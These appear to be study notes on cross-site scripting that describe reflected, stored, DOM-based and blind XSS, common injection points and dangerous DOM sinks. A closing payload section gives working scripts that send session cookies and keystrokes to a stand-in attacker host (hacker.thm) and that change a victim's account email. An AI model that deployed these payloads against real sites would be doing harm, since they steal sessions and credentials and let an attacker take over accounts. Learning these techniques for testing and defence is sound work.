# Cross Site Scripting(XSS)

### Attack Vectors

- Customizable Themes & Profiles via CSS
- Event or meeting names
- URI based
- Imported from a 3rd party (think Facebook integration)
- JSON POST Values (check returning content type)
- File Upload names
- Uploaded files (swf, HTML, ++)
- Custom Error pages
- fake params - ?realparam=1&foo=bar’+alert(/XSS/)+’
- Login and Forgot password forms
<a/>

<!-- -->
				Reflected XSS
##### Reflected XSS arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

-   Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

<!-- -->


Examples:
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers

<!-- -->

				Stored XSS				
##### The payload is stored on the web application and then gets run when other users visit the site or web page.
Examples:
- Comments on a blog
- User profile information
-  Nicknames in a chatroom  
- Website Listings

<!-- -->

				Dom-Based XSS		
##### Contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

- Attack vector is usually the url

- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

- attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with.

Common sinks that lead to Dom-XSS:
-  document.write()
-  document.writeln()
-  document.domain
-  element.innerHTML
-  element.outerHTML
-  element.insertAdjacentHTML
-  element.onevent

<!-- -->

 
					Blind XSS				
##### your payload gets stored on the website for another user to view, but you can't see the payload working or be able to test it against yourself first.

-- xsshunter

				Basic Payloads
## Session Stealing
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

## Key logger 
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

## Business Logic(so you can change their Password)
`<script>user.changeEmail('attacker@hacker.thm');</script>`

## Beef Framework

[XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)